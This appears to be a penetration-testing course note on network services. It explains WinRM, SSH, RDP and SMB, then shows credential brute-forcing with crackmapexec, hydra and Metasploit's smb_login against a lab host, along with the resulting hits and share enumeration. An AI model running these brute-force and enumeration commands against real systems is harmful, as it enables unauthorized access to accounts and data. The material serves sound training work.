# Network Services

***

During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content.&#x20;

<table data-full-width="true"><thead><tr><th>-----------------</th><th>--------------------</th><th>-----------</th></tr></thead><tbody><tr><td>FTP</td><td>SMB</td><td>NFS</td></tr><tr><td>IMAP/POP3</td><td>SSH</td><td>MySQL/MSSQL</td></tr><tr><td>RDP</td><td>WinRM</td><td>VNC</td></tr><tr><td>Telnet</td><td>SMTP</td><td>LDAP</td></tr></tbody></table>

All these services have an authentication mechanism using a username and password.&#x20;

***

## <mark style="color:red;">WinRM</mark>

:window: **WinRM** est une technologie de Microsoft qui permet de gérer des systèmes Windows à distance. Elle utilise un protocole réseau appelé **WS-Management** basé sur des services web (SOAP et XML). Avec WinRM, un administrateur peut exécuter des commandes, configurer des systèmes, ou collecter des informations sur des machines à distance.

However, for security reasons, WinRM must be activated and configured manually in Windows 10.&#x20;

* In most cases, one uses certificates or only specific authentication mechanisms to increase its security.&#x20;
* WinRM uses the TCP ports <mark style="color:orange;">**`5985`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**(**</mark><mark style="color:orange;">**`HTTP`**</mark><mark style="color:orange;">**) and**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`5986`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**(**</mark><mark style="color:orange;">**`HTTPS`**</mark><mark style="color:orange;">**).**</mark>
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.&#x20;

***

### <mark style="color:blue;">**CrackMapExec**</mark>

<mark style="color:green;">**Installing CrackMapExec**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo apt-get -y install crackmapexec
```

<mark style="color:green;">**CrackMapExec Menu Options**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$  crackmapexec -h
```
{% endcode %}

<mark style="color:green;">**CrackMapExec Protocol-Specific Help**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb -h
```
{% endcode %}

<mark style="color:green;">**CrackMapExec Usage**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
{% endcode %}

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```
{% endcode %}

Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

***

### <mark style="color:blue;">**Evil-WinRM**</mark>

<mark style="color:green;">**Installing Evil-WinRM**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem

```
{% endcode %}

<mark style="color:green;">**Evil-WinRM Usage**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```
{% endcode %}

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
```
{% endcode %}

***

## <mark style="color:red;">SSH</mark>

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client.&#x20;

* This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

***

### <mark style="color:blue;">**Symmetric Encryption**</mark>

**Symmetric encryption** uses the **`same key`** for encryption and decryption. However, anyone who has access to the key could also access the transmitted data.&#x20;

Therefore, a key exchange procedure is needed for secure symmetric encryption. The [Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) key exchange method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.

### <mark style="color:blue;">**Asymmetrical Encryption**</mark>

Asymmetric encryption uses **`two SSH keys`**: a **private key and a public key**. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.

### <mark style="color:blue;">**Hashing**</mark>

The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

***

### <mark style="color:blue;">**Hydra - SSH**</mark>

We can use a tool such as `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
```
{% endcode %}

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ ssh user@10.129.42.197
```
{% endcode %}

***

## <mark style="color:red;">Remote Desktop Protocol (RDP)</mark>

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization.&#x20;

Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission.&#x20;

### <mark style="color:blue;">**Hydra - RDP**</mark>

We can also use `Hydra` to perform RDP bruteforcing.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197


1 of 1 target successfully completed, 1 valid password found
```
{% endcode %}

Linux offers different clients to communicate with the desired server using the RDP protocol. These include [Remmina](https://remmina.org/), [rdesktop](http://www.rdesktop.org/), [xfreerdp](https://linux.die.net/man/1/xfreerdp), and many others. For our purposes, we will work with xfreerdp.

### <mark style="color:blue;">**xFreeRDP**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
{% endcode %}

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ xfreerdp /v:10.129.7.0 /u:htb-student /p:Academy_student_AD!
```
{% endcode %}

![](https://academy.hackthebox.com/storage/modules/147/RDP.png)

***

## <mark style="color:red;">SMB</mark>

[**Server Message Block**](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) **(`SMB`)** is a protocol responsible for transferring data between a client and a server in local area networks.&#x20;

It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

SMB is also known as [**Common Internet File System**](https://cifs.com/) **(`CIFS`)**. It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter [Samba](https://wiki.samba.org/index.php/Main_Page), which is an open-source implementation of the above functions. For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.

### <mark style="color:blue;">**Hydra - SMB**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```
{% endcode %}

However, we may also get the following error describing that the server has sent an invalid reply.

### <mark style="color:blue;">**Hydra - Error**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
{% endcode %}

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

### <mark style="color:blue;">**Metasploit Framework**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
  
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
{% endcode %}

Now we can use <mark style="color:orange;">**`CrackMapExec`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**again to view the available shares and what privileges we have for them.**</mark>

### <mark style="color:blue;">**CrackMapExec**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```
{% endcode %}

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

### <mark style="color:blue;">**Smbclient**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```
